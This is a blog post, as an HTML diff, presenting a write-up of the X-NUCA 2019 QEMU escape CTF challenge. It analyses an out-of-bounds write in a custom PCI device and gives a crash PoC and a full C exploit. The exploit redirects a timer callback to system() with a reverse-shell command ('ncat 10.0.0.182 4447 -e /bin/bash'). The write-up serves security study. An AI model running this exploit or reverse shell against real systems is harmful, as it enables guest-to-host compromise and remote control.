@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Qemu Escape Ctf - hypblog</title><meta name="Description" content="hyplog"><meta property="og:title" content="Qemu Escape Ctf" />
+<meta property="og:description" content="Qemu Escape CTF Writeup This writeup will demonstrate my analysis and solution of the X-NUCA 2019 qemu escape CTF challenge. For those interested in following along or attempting the challenge themselves, the archive can be found at vexx.zip
+Initial Analysis After extracting the archive, we are presented with the following files.
+launch.sh is of interest here as it includes specific arguments for running this version of qemu, including a reference to a custom device named vexx." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scratchadams.github.io/posts/qemu-escape-ctf/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-27T16:23:02-04:00" />
+<meta property="article:modified_time" content="2024-06-27T16:23:02-04:00" /><meta property="og:site_name" content="hyplog" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Qemu Escape Ctf"/>
+<meta name="twitter:description" content="Qemu Escape CTF Writeup This writeup will demonstrate my analysis and solution of the X-NUCA 2019 qemu escape CTF challenge. For those interested in following along or attempting the challenge themselves, the archive can be found at vexx.zip
+Initial Analysis After extracting the archive, we are presented with the following files.
+launch.sh is of interest here as it includes specific arguments for running this version of qemu, including a reference to a custom device named vexx."/>
+<meta name="application-name" content="hyplog">
+<meta name="apple-mobile-web-app-title" content="hyplog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://scratchadams.github.io/posts/qemu-escape-ctf/" /><link rel="prev" href="https://scratchadams.github.io/posts/cve-2021-33913/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Qemu Escape Ctf",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/scratchadams.github.io\/posts\/qemu-escape-ctf\/"
+        },"genre": "posts","wordcount":  1845 ,
+        "url": "https:\/\/scratchadams.github.io\/posts\/qemu-escape-ctf\/","datePublished": "2024-06-27T16:23:02-04:00","dateModified": "2024-06-27T16:23:02-04:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "hyp"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="hypblog">hyplog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="hypblog">hyplog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Qemu Escape Ctf</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>hyp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-06-27">2024-06-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1845 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><h1 id="qemu-escape-ctf-writeup">Qemu Escape CTF Writeup</h1>
+<p>This writeup will demonstrate my analysis and solution of the X-NUCA 2019 qemu escape CTF challenge. For those interested in following along or attempting the challenge themselves, the archive can be found at <a href="https://drive.google.com/file/d/1YJPumonM6ZC9biulWESBJTF7Dkxb_GI-/view?usp=sharing" target="_blank" rel="noopener noreffer ">vexx.zip</a></p>
+<h1 id="initial-analysis">Initial Analysis</h1>
+<p>After extracting the archive, we are presented with the following files.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_f3MzSfuy-r4B3CIESL4jEQ.png"
+        data-srcset="/images/1_f3MzSfuy-r4B3CIESL4jEQ.png, /images/1_f3MzSfuy-r4B3CIESL4jEQ.png 1.5x, /images/1_f3MzSfuy-r4B3CIESL4jEQ.png 2x"
+        data-sizes="auto"
+        alt="/images/1_f3MzSfuy-r4B3CIESL4jEQ.png"
+        title="/images/1_f3MzSfuy-r4B3CIESL4jEQ.png" /></p>
+<p>launch.sh is of interest here as it includes specific arguments for running this version of qemu, including a reference to a custom device named vexx.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_xcWgHo7G6Q5vLi8RqjBxeg.png"
+        data-srcset="/images/1_xcWgHo7G6Q5vLi8RqjBxeg.png, /images/1_xcWgHo7G6Q5vLi8RqjBxeg.png 1.5x, /images/1_xcWgHo7G6Q5vLi8RqjBxeg.png 2x"
+        data-sizes="auto"
+        alt="/images/1_xcWgHo7G6Q5vLi8RqjBxeg.png"
+        title="/images/1_xcWgHo7G6Q5vLi8RqjBxeg.png" /></p>
+<p>Taking a look at the qemu image in Ghidra, we can see a number of functions and types associated with the vexx device.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_k8huRWFWT9rZ8trKURygdg.png"
+        data-srcset="/images/1_k8huRWFWT9rZ8trKURygdg.png, /images/1_k8huRWFWT9rZ8trKURygdg.png 1.5x, /images/1_k8huRWFWT9rZ8trKURygdg.png 2x"
+        data-sizes="auto"
+        alt="/images/1_k8huRWFWT9rZ8trKURygdg.png"
+        title="/images/1_k8huRWFWT9rZ8trKURygdg.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_qptBsthVDzcNKmsohqbNNg.png"
+        data-srcset="/images/1_qptBsthVDzcNKmsohqbNNg.png, /images/1_qptBsthVDzcNKmsohqbNNg.png 1.5x, /images/1_qptBsthVDzcNKmsohqbNNg.png 2x"
+        data-sizes="auto"
+        alt="/images/1_qptBsthVDzcNKmsohqbNNg.png"
+        title="/images/1_qptBsthVDzcNKmsohqbNNg.png" /></p>
+<p>After some trial and error with retyping, we can get a better idea of how this custom device functions. Let’s take a look at the <strong>vexx_class_init</strong> function to see how the device is initialized.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_BXLnVyEhWQTx5lwiksqjRw.png"
+        data-srcset="/images/1_BXLnVyEhWQTx5lwiksqjRw.png, /images/1_BXLnVyEhWQTx5lwiksqjRw.png 1.5x, /images/1_BXLnVyEhWQTx5lwiksqjRw.png 2x"
+        data-sizes="auto"
+        alt="/images/1_BXLnVyEhWQTx5lwiksqjRw.png"
+        title="/images/1_BXLnVyEhWQTx5lwiksqjRw.png" /></p>
+<p>This particular function provides some useful information, such as the vendor id and device id which we will use later. We can also see that two function handlers, <strong>realize</strong> and <strong>exit</strong>, are set to the device specific functions, <strong>pci_vexx_realize</strong> and <strong>pci_vexx_uninit</strong>. The realize function will be called when this device is registered and the exit function will be called when the device is unregistered.</p>
+<p>Let’s take a look at <strong>pci_vexx_realize</strong> to see how it functions.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_MyVIq_N9pNCvo48GYYlhzw.png"
+        data-srcset="/images/1_MyVIq_N9pNCvo48GYYlhzw.png, /images/1_MyVIq_N9pNCvo48GYYlhzw.png 1.5x, /images/1_MyVIq_N9pNCvo48GYYlhzw.png 2x"
+        data-sizes="auto"
+        alt="/images/1_MyVIq_N9pNCvo48GYYlhzw.png"
+        title="/images/1_MyVIq_N9pNCvo48GYYlhzw.png" /></p>
+<p>Looking at lines 25 and 26, we can see that two mmio regions are initialized and associated with <strong>vexx_mmio_ops</strong> and <strong>vexx_cmb_ops</strong>. Both of these ops structures contain functions that will be called when those MMIO regions are accessed. We can also see that the calls to <strong>memory_region_init_io</strong> reference a specific size, 0x1000 for <strong>vexx_mmio_ops</strong> and 0x4000 for <strong>vexx_cmb_ops</strong>. These size values will help us determine how to map the appropriate sysfs resource file into memory when we want to interact with these MMIO regions.</p>
+<p>We can also see that on lines 27 through 29, IO ports are registered and associated with <strong>vexx_port_list</strong> which contains functions that will be called when we access those particular ports.</p>
+<p>The previously mentioned MMIO regions and IO ports give us some attack surface through which we can interact with this custom device. The functions that they are associated with are <strong>vexx_mmio_write</strong> and <strong>vex_mmio_read</strong> for the first MMIO region, <strong>vexx_cmb_write</strong> and <strong>vexx_cmb_read</strong> for the second MMIO region, and <strong>vexx_ioport_write</strong> and <strong>vexx_ioport_read</strong> for the IO ports. Taking a closer look at these functions, we can see there is a fairly obvious vulnerability in the <strong>vexx_cmb_write</strong> function.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_Ae9SnWwmk2q8UxXyWrVCZA.png"
+        data-srcset="/images/1_Ae9SnWwmk2q8UxXyWrVCZA.png, /images/1_Ae9SnWwmk2q8UxXyWrVCZA.png 1.5x, /images/1_Ae9SnWwmk2q8UxXyWrVCZA.png 2x"
+        data-sizes="auto"
+        alt="/images/1_Ae9SnWwmk2q8UxXyWrVCZA.png"
+        title="/images/1_Ae9SnWwmk2q8UxXyWrVCZA.png" /></p>
+<p>On line 30, we can see some offset of <strong>req_buf</strong> getting set to the value we pass into this function. We also can see on line 25 that the size, <strong>addr</strong>, is evaluated to make sure it isn’t over 255 bytes (0x100). If we look at the definition for <strong>req_bytes</strong>, we can see that it is a char buffer with a size of 256 bytes.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_ga79BRl5Gp4BRQ3aapdBSg.png"
+        data-srcset="/images/1_ga79BRl5Gp4BRQ3aapdBSg.png, /images/1_ga79BRl5Gp4BRQ3aapdBSg.png 1.5x, /images/1_ga79BRl5Gp4BRQ3aapdBSg.png 2x"
+        data-sizes="auto"
+        alt="/images/1_ga79BRl5Gp4BRQ3aapdBSg.png"
+        title="/images/1_ga79BRl5Gp4BRQ3aapdBSg.png" /></p>
+<p>The check on line 25 would limit the size of this offset to below the buffer’s limit, but we can see that after the size check on line 28 the size gets increased by an offset value, which we will see is an attacker controlled value. Looking at the other functions associated with MMIO and port IO, we can see that both the offset variable and the memorymode value are controllable by writing to specific IP ports.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_K9csurtvYmpguJdD7CKOOw.png"
+        data-srcset="/images/1_K9csurtvYmpguJdD7CKOOw.png, /images/1_K9csurtvYmpguJdD7CKOOw.png 1.5x, /images/1_K9csurtvYmpguJdD7CKOOw.png 2x"
+        data-sizes="auto"
+        alt="/images/1_K9csurtvYmpguJdD7CKOOw.png"
+        title="/images/1_K9csurtvYmpguJdD7CKOOw.png" /></p>
+<p>Based on this function, we can see that by writing to port 0x240 we can modify the <strong>offset</strong> and by writing to port 0x230 we can modify <strong>memorymode</strong>. If we go ahead and set <strong>memorymode</strong> to 0x1 and <strong>offset</strong> to 0xFF and trigger a call to <strong>vexx_cmb_write</strong>, we can hit the else statement at line 24 of <strong>vexx_cmb_write</strong> and start writing at the end of <strong>req_buf</strong> (i.e — req_buf[255]) which should allow us to overwrite up to 255 bytes past <strong>req_buf</strong> (anything past 255 bytes would fail the check on line 25 of <strong>vexx_cmb_write</strong>).</p>
+<h1 id="identifying-a-target">Identifying a target</h1>
+<p>Now that we understand how to trigger the OOB write vulnerability, let’s take a look at what possible targets we may be able to overwrite. If we look at the structure that contains <strong>req_buf</strong>, we can see the next member of that structure labeled <strong>vexxdma</strong>, which contains a member labeled <strong>dma_timer</strong>. Within the <strong>dma_timer struct</strong>, we see a field labeled <strong>cb</strong> which contains a function pointer. It is safe to assume that <strong>cb</strong> stands for callback and this structure defines some function to be called by a timer.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_y68jgPmFqCvC6X-6k6Pr0A.png"
+        data-srcset="/images/1_y68jgPmFqCvC6X-6k6Pr0A.png, /images/1_y68jgPmFqCvC6X-6k6Pr0A.png 1.5x, /images/1_y68jgPmFqCvC6X-6k6Pr0A.png 2x"
+        data-sizes="auto"
+        alt="/images/1_y68jgPmFqCvC6X-6k6Pr0A.png"
+        title="/images/1_y68jgPmFqCvC6X-6k6Pr0A.png" /></p>
+<p>If we refer back to the <strong>vexx_class_init</strong> function, we can see a call to <strong>timer_init_full</strong> which references the <strong>dma_timer</strong> structure. Also, another reference to this structure is made in the <strong>vexx_mmio_write</strong> function in a call to a function labeled <strong>timer_mod</strong>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_W5VkXJOGkZ2-45uzZMcohQ.png"
+        data-srcset="/images/1_W5VkXJOGkZ2-45uzZMcohQ.png, /images/1_W5VkXJOGkZ2-45uzZMcohQ.png 1.5x, /images/1_W5VkXJOGkZ2-45uzZMcohQ.png 2x"
+        data-sizes="auto"
+        alt="/images/1_W5VkXJOGkZ2-45uzZMcohQ.png"
+        title="/images/1_W5VkXJOGkZ2-45uzZMcohQ.png" /></p>
+<p>Both <strong>timer_init_full</strong> and <strong>timer_mod</strong> are part of the qemu code base, and looking at their definitions, we can get a better idea of what they do.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_KtQPq7D-NJtVPit_5jPBEw.png"
+        data-srcset="/images/1_KtQPq7D-NJtVPit_5jPBEw.png, /images/1_KtQPq7D-NJtVPit_5jPBEw.png 1.5x, /images/1_KtQPq7D-NJtVPit_5jPBEw.png 2x"
+        data-sizes="auto"
+        alt="/images/1_KtQPq7D-NJtVPit_5jPBEw.png"
+        title="/images/1_KtQPq7D-NJtVPit_5jPBEw.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_Xst5XR8jkEyGTpEb8zEkIA.png"
+        data-srcset="/images/1_Xst5XR8jkEyGTpEb8zEkIA.png, /images/1_Xst5XR8jkEyGTpEb8zEkIA.png 1.5x, /images/1_Xst5XR8jkEyGTpEb8zEkIA.png 2x"
+        data-sizes="auto"
+        alt="/images/1_Xst5XR8jkEyGTpEb8zEkIA.png"
+        title="/images/1_Xst5XR8jkEyGTpEb8zEkIA.png" /></p>
+<p>Reading the comments associated with these functions, we can see that <strong>timer_init_full</strong> is used to initialize a timer, and that cb is indeed a callback function and the opaque field is actually passed to the callback function as an argument, which will prove very useful. We can also see that <strong>timer_mod</strong> is used to modify an existing timer.</p>
+<p>The idea here is that we are going to overwrite the <strong>cb</strong> and <strong>opaque</strong> fields of the <strong>dma_timer</strong> struct with arbitrary values and then make a call to <strong>vexx_mmio_write</strong> with the proper value (0x98 based on the if-statement) and see if that causes a crash. To do this, we will need to calculate the different between our OOB write (<strong>req_buf</strong> + 0xff) and the <strong>cb</strong> and <strong>opaque</strong> fields.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_OLOAeOBCZ2rPNROOs9hmPg.png"
+        data-srcset="/images/1_OLOAeOBCZ2rPNROOs9hmPg.png, /images/1_OLOAeOBCZ2rPNROOs9hmPg.png 1.5x, /images/1_OLOAeOBCZ2rPNROOs9hmPg.png 2x"
+        data-sizes="auto"
+        alt="/images/1_OLOAeOBCZ2rPNROOs9hmPg.png"
+        title="/images/1_OLOAeOBCZ2rPNROOs9hmPg.png" /></p>
+<p>Since the start of <strong>req_buf</strong> is 0x55555739b520 and the <strong>offset</strong> value we will set is 0xff, we will calculate the distance between 0x55555739b61f and 0x55555739b658 which is 0x39 or 57 bytes and between 0x55555739b61f and 0x55555739b660 which is 0x41 or 65 bytes.</p>
+<h1 id="causing-a-crash">Causing a crash</h1>
+<p>To properly trigger this vulnerability, we will have to set the permissions on the IO ports we want to write to, then write to them using the <strong>outb</strong> function. We will also have to make 2 calls to <strong>mmap</strong> in order to provide a useable mapping of the MMIO regions discussed earlier, then write to the calculated offsets within the <strong>vexx_cmb</strong> MMIO region to overwrite our targets and write to address 0x98 of the <strong>vexx_mmio</strong> MMIO region to trigger the <strong>timer_mod</strong> function to update our timer with the overwritten callback function and arguments.</p>
+<p>To write a PoC that will trigger this crash, we need to identify the sysfs resource files associated with the two MMIO regions that need to be mapped. This can be achieved using lspci utility and locating the entries associated with the vendor and device IDs we saw declared in the <strong>vexx_class_init</strong> function.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_UTCwbntWQdnK_1qjZ3TKaw.png"
+        data-srcset="/images/1_UTCwbntWQdnK_1qjZ3TKaw.png, /images/1_UTCwbntWQdnK_1qjZ3TKaw.png 1.5x, /images/1_UTCwbntWQdnK_1qjZ3TKaw.png 2x"
+        data-sizes="auto"
+        alt="/images/1_UTCwbntWQdnK_1qjZ3TKaw.png"
+        title="/images/1_UTCwbntWQdnK_1qjZ3TKaw.png" /></p>
+<p>Knowing that the vexx device was registered with a vendor ID of 0x1234 and a device ID of 0x11E9, we easily spot the corresponding entry for this device in the lspci output. Using the BFD, 00:04.0, we can take a look at the sysfs directory shown below.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_GszCQLVkOXKGEor6eFDc5g.png"
+        data-srcset="/images/1_GszCQLVkOXKGEor6eFDc5g.png, /images/1_GszCQLVkOXKGEor6eFDc5g.png 1.5x, /images/1_GszCQLVkOXKGEor6eFDc5g.png 2x"
+        data-sizes="auto"
+        alt="/images/1_GszCQLVkOXKGEor6eFDc5g.png"
+        title="/images/1_GszCQLVkOXKGEor6eFDc5g.png" /></p>
+<p>The two resource files highlighted in the above image, resource0 and resource1, represent the two MMIO regions that were registered in the <strong>pci_vexx_realize</strong> function. If we look back at that function, we can see that the <strong>vexx_cmb</strong> region was initialized with a size of 0x4000 bytes and <strong>vexx_mmio</strong> was initialized with a size of 0x1000 bytes. Looking at the file sizes in the sysfs directory, we see that resource0 is 4096 or 0x1000 and resource1 is 16384 or 0x4000 which tells us that resource0 represents <strong>vexx_mmio</strong> and resource1 represents <strong>vexx_cmb</strong>.</p>
+<p>We now have everything we need to build a PoC and cause a crash.</p>
+<pre tabindex="0"><code>#include &lt;stdlib.h&gt;  
+#include &lt;string.h&gt;  
+#include &lt;sys/io.h&gt;  
+#include &lt;sys/types.h&gt;  
+#include &lt;sys/stat.h&gt;  
+#include &lt;sys/mman.h&gt;  
+#include &lt;fcntl.h&gt;  
+  
+#define OFF_PORT 0x240  
+#define MOD_PORT 0x230  
+int main(int argc, char *argv[]) {  
+    //Adjust permissions on ports 0x240 and 0x230  
+    if(ioperm(OFF_PORT, 3, 1)) {  
+        exit(1);  
+    }  
+    if(ioperm(MOD_PORT, 3, 1)) {  
+        exit(2);  
+    }  
+    //set offset to 0xFF  
+    outb(0xFF, OFF_PORT);  
+    //set memorymode to 0x1  
+    outb(0x1, MOD_PORT);  
+    //open resource file associated with vexx_cmb MMIO region  
+    int cfd = open(argv[1], O_RDWR|O_SYNC);  
+    if(cfd &lt; 0) {  
+        exit(3);  
+    }  
+      
+    //open resource file associated with vexx_mmio MMIO region  
+    int mfd = open(argv[2], O_RDWR|O_SYNC);  
+    if(mfd &lt; 0) {  
+        exit(4);  
+    }  
+    //create vexx_cmb mapping  
+    void *cmb = mmap(NULL, 0x4000,   
+     PROT_READ|PROT_WRITE, MAP_SHARED, cfd, 0);  
+ if(cmb == MAP_FAILED) {  
+     exit(4);  
+ }  
+ //create vexx_mmio mapping  
+ void *mmio = mmap(NULL, 0x1000,   
+  PROT_READ|PROT_WRITE, MAP_SHARED, mfd, 0);  
+ if(mmio == MAP_FAILED) {  
+     exit(5);  
+ }  
+ //trigger vexx_cmb_write to overwrite cb field  
+ *(u_int64_t *)(cmb + atoi(argv[3])) = 0x4141414141414141;  
+ //trigger vexx_cmb_write to overwrite opaque field  
+ *(u_int64_t *)(cmb + atoi(argv[4])) = 0x4242424242424242;  
+ //trigger vexx_mmio_write to call timer_mod  
+ *(u_int64_t *)(mmio + atoi(argv[5])) = 0x1;  
+ exit(0);  
+}  
+</code></pre><pre tabindex="0"><code>./exp /sys/devices/pci0000:00/0000:00:04.0/resource1 /sys/devices/pci0000:00/0000:00:04.0/resource0 57 65 152
+</code></pre><p>If we attach to our running qemu process with gdb, set a breakpoint on <strong>vexx_cmb_write</strong> and execute our PoC, we see that we are sucessfully overwriting the <strong>cb</strong> and <strong>opaque</strong> fields of the <strong>dma_timer</strong> struct.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_Yp8wmmqbOzpE1WeUL1NiUA.png"
+        data-srcset="/images/1_Yp8wmmqbOzpE1WeUL1NiUA.png, /images/1_Yp8wmmqbOzpE1WeUL1NiUA.png 1.5x, /images/1_Yp8wmmqbOzpE1WeUL1NiUA.png 2x"
+        data-sizes="auto"
+        alt="/images/1_Yp8wmmqbOzpE1WeUL1NiUA.png"
+        title="/images/1_Yp8wmmqbOzpE1WeUL1NiUA.png" /></p>
+<p>If we continue from here, we can see that qemu segfaults on a call to r14 which holds the value to <strong>cb</strong> that we overwrite. We can also see that the rdi register is set to the overwritten value of <strong>opaque</strong> which will function as an argument to the called function.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_LXcGfISOvk2ZgKr2wFvzRg.png"
+        data-srcset="/images/1_LXcGfISOvk2ZgKr2wFvzRg.png, /images/1_LXcGfISOvk2ZgKr2wFvzRg.png 1.5x, /images/1_LXcGfISOvk2ZgKr2wFvzRg.png 2x"
+        data-sizes="auto"
+        alt="/images/1_LXcGfISOvk2ZgKr2wFvzRg.png"
+        title="/images/1_LXcGfISOvk2ZgKr2wFvzRg.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_KH-uyZrvp40-qw_x6pPsWg.png"
+        data-srcset="/images/1_KH-uyZrvp40-qw_x6pPsWg.png, /images/1_KH-uyZrvp40-qw_x6pPsWg.png 1.5x, /images/1_KH-uyZrvp40-qw_x6pPsWg.png 2x"
+        data-sizes="auto"
+        alt="/images/1_KH-uyZrvp40-qw_x6pPsWg.png"
+        title="/images/1_KH-uyZrvp40-qw_x6pPsWg.png" /></p>
+<h1 id="exploitation">Exploitation</h1>
+<p>So with this vulnerability, we essentially have the ability to call an arbitrary address and pass along a controlled parameter. The first thought is to make a call to <strong>system</strong> and pass along an argument to establish a reverse shell. The one caveat to this is that the <strong>opaque</strong> field which will contain the argument for our call to <strong>system</strong> behaves as a pointer so we can’t just write our argument string to that field. Instead, we need to write the argument string somewhere else and then reference it in the <strong>opaque</strong> field. Looking back at the vexxdma structure where our target exists, we can see another char buffer called <strong>dma_buf</strong> which appears to be a good location to store our argument string.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1_JXs6ls7kr-0Cn2nsxF6v5Q.png"
+        data-srcset="/images/1_JXs6ls7kr-0Cn2nsxF6v5Q.png, /images/1_JXs6ls7kr-0Cn2nsxF6v5Q.png 1.5x, /images/1_JXs6ls7kr-0Cn2nsxF6v5Q.png 2x"
+        data-sizes="auto"
+        alt="/images/1_JXs6ls7kr-0Cn2nsxF6v5Q.png"
+        title="/images/1_JXs6ls7kr-0Cn2nsxF6v5Q.png" /></p>
+<p>After making these adjustments, our final exploit is as follows:</p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;  
+#include &lt;stdlib.h&gt;  
+#include &lt;string.h&gt;  
+#include &lt;sys/io.h&gt;  
+#include &lt;sys/types.h&gt;  
+#include &lt;sys/stat.h&gt;  
+#include &lt;sys/mman.h&gt;  
+#include &lt;fcntl.h&gt;  
+	  
+#define OFF_PORT 0x240  
+#define MOD_PORT 0x230  
+  
+int main(int argc, char *argv[]) {  
+    //Adjust permissions on ports 0x240 and 0x230  
+    if(ioperm(OFF_PORT, 3, 1)) {  
+        exit(1);  
+    }  
+    if(ioperm(MOD_PORT, 3, 1)) {  
+        exit(2);  
+    }  
+      
+    //set offset to 0xFF  
+    outb(0xFF, OFF_PORT);  
+      
+    //set memorymode to 0x1  
+    outb(0x1, MOD_PORT);  
+    //open resource file associated with vexx_cmb MMIO region  
+    int cfd = open(argv[1], O_RDWR|O_SYNC);  
+    if(cfd &lt; 0) {  
+        exit(3);  
+    }  
+      
+    //open resource file associated with vexx_mmio MMIO region  
+    int mfd = open(argv[2], O_RDWR|O_SYNC);  
+    if(mfd &lt; 0) {  
+        exit(4);  
+    }  
+    //create vexx_cmb mapping  
+    void *cmb = mmap(NULL, 0x4000,   
+     PROT_READ|PROT_WRITE, MAP_SHARED, cfd, 0);  
+    if(cmb == MAP_FAILED) {  
+        exit(4);  
+    }  
+    //create vexx_mmio mapping  
+    void *mmio = mmap(NULL, 0x1000,   
+     PROT_READ|PROT_WRITE, MAP_SHARED,  mfd, 0);  
+    if(mmio == MAP_FAILED) {  
+        exit(5);  
+    }  
+    //copy argument string to dma_buf buffer  
+    strcpy((cmb+0x59), &#34;ncat 10.0.0.182 4447 -e /bin/bash&#34;);  
+    //trigger vexx_cmb_write to overwrite cb field w/ address of  system()  
+    *(u_int64_t *)(cmb + atoi(argv[3])) = 0x7ffff79dd290;  
+      
+    //trigger vexx_cmb_write to overwrite opaque field w. pointer to dma_buf  
+    *(u_int64_t *)(cmb + atoi(argv[4])) = 0x55555739b678;  
+      
+    //trigger vexx_mmio_write to call timer_mod  
+    *(u_int64_t *)(mmio + atoi(argv[5])) = 0x1;  
+    exit(0);  
+}
+</code></pre><pre tabindex="0"><code>./exp /sys/devices/pci0000:00/0000:00:04.0/resource1 /sys/devices/pci0000:00/0000:00:04.0/
+</code></pre></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-06-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://scratchadams.github.io/posts/qemu-escape-ctf/" data-title="Qemu Escape Ctf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://scratchadams.github.io/posts/qemu-escape-ctf/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://scratchadams.github.io/posts/qemu-escape-ctf/" data-title="Qemu Escape Ctf"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://scratchadams.github.io/posts/qemu-escape-ctf/" data-title="Qemu Escape Ctf"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://scratchadams.github.io/posts/qemu-escape-ctf/" data-title="Qemu Escape Ctf"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
